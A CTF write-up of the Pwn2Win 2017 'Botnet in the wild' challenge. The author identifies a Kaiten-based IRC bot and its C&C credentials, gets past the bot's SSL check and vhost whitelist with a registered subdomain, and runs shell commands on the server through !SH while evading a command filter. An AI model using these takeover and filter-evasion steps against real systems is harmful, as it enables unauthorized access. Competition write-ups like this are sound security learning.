This weekend me and a couple of teammates took part in the 48 hours long Pwn2Win CTF 2017. It was a pretty challenging CTF, especially since there weren't a lot of challenges in the categories I usually do, but in the end we managed to place 10th on the scoreboard.

# Botnet in the wild

> Our team got access to this malware, and we believe a modified version of it was used to infect a BloodSuckers server by an unidentified group. Analyze this malware, get access to the C&C and then pwn the server that's running it. Finally, find and exfiltrate any Important Files in the server and submit the flag in the format 'CTF-BR{md5sum-of-important-file}'

I didn't want to spin up a VM to run the malware in unless I had to, so I ran `strings botnetinthewild` and searched for anything interesting. One of the first things that I noticed was the line `NOTICE %s :Kaiten wa goraku`. After a quick Google search for the phrase, I found [this source file](/assets/pwn2win-ctf-2017/kaiten.c), which the challenge's malware is based on.

This is what I learned from the source and the strings from earlier:
* The malware uses an IRC server as its C&C server.
* The IRC server is located at `bloodfuckers.mooo.info`
* The channel is `#bloodfuckers`
* The password for the channel is `TrespasserWillBeShot`

Before I tried to connect to the IRC server I did an nmap scan:

{% highlight text %}
$ nmap bloodfuckers.mooo.info

Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-22 04:20 UTC
Nmap scan report for bloodfuckers.mooo.info (45.77.73.247)
Host is up (0.032s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
2222/tcp open  EtherNetIP-1
{% endhighlight %}

I used the IRC client [WeeChat](https://weechat.org/) to connect to the server:

{% highlight text %}
$ weechat

In WeeChat:
/server add mooo bloodfuckers.mooo.info/2222
/connect mooo
/join #bloodfuckers TrespasserWillBeShot
{% endhighlight %}

In the channel we can see a single other user called `CEPGHPC`. I didn't have permission to write in the channel, so I wrote a private message to the user using `/query CEPGHPC`. I knew a list of commands from the source, so I first of all tried `!HELP` to confirm that this user was actually the bot. This is the abbreviated output: 

{% highlight text %}
tobloef: !HELP
CEPGHPC: GET <http address> <save as>
    = Downloads a file off the web and saves it onto the hd
CEPGHPC: IRC <command>
    = Sends this command to the server
CEPGHPC: SH <command>
    = Executes a command
CEPGHPC: AUTH
    = Whitelisted domains to manage this knight
{% endhighlight %}

After trying the different commands I learned that `!GET` and `!IRC` was disabled in this version of the bot, but `!SH` wasn't. Let's try it:

{% highlight text %}
tobloef: !SH
CEPGHPC: Sorry, you're not using a Secure Connection.
{% endhighlight %}

I knew from earlier that the server had port 443 (https) open, so I reconnected to the IRC using this port. I also had to set `moo.ssl = on` and `moo.ssl_verify = off` in `~/.weechat/irc.conf` to accept their valid certificate.

{% highlight text %}
tobloef: !SH
CEPGHPC: Sorry, your vhost is not whitelisted, you are not authorized to send commands!
{% endhighlight %}

The `!AUTH` command shows the whitelisted domains:
{% highlight text %}
tobloef: !AUTH
CEPGHPC: Whitelisted domains:
CEPGHPC: *.fearpenguins.com
{% endhighlight %}

I found out that you could register `fearpenguins.com` subdomains at [afraid.org](http://freedns.afraid.org/subdomain/), so I created the subdomain `tobloef.fearpenguins.com` and pointed it to a [DigitalOcean](https://m.do.co/c/a92261ae10d2) VPS. I choose DigitalOcean over the cheaper alternative [Vultr](https://www.vultr.com/?ref=7125087) because I needed to set up a PTR record to make reverse DNS work, something which Vultr doesn't support as far as I know. I renamed the droplet to `tobloef.fearpenguins.com` to automatically create the PTR records for reverse DNS, so that the IRC server will know that the droplet's domain is `tobloef.fearpenguins.com`.

At this point the bot had crashed and the author of the challenge was asleep, so I took the opportunity to get some sleep and when I woke up the bot was up again. This time the `!SH` command worked:

{% highlight text %}
tobloef: !SH ls
CEPGHPC: bot.py
{% endhighlight %}

At this point I did a lot of testing to see what I could do on the server. I didn't have permissions to read the file `bot.py` and a lot of different commands were blocked by some kind of filter script. In the end I found the file `/media/disk0/bacup/Important_files.7z`, which was probably the file I needed to get hash of. I knew from testing that the string `md5sum` was blocked, so I needed to get the hash some other way. At this point my teammate found a way to get the MD5 hash using a python script which could be written to `/temp` and bypassing the filter on the string `python` by using multiple `echo` commands, but in the end we found a simpler solution.

{% highlight text %}
tobloef: !SH openssl md5 /media/disk0/backup/Important_Files.7z
CEPGHPC: MD5(/media/disk0/backup/Important_Files.7z) =
CEPGHPC: 032e4bc3180d0836dad146277532dc88
{% endhighlight %} 

**Flag:** `CTF-BR{032e4bc3180d0836dad146277532dc88}`
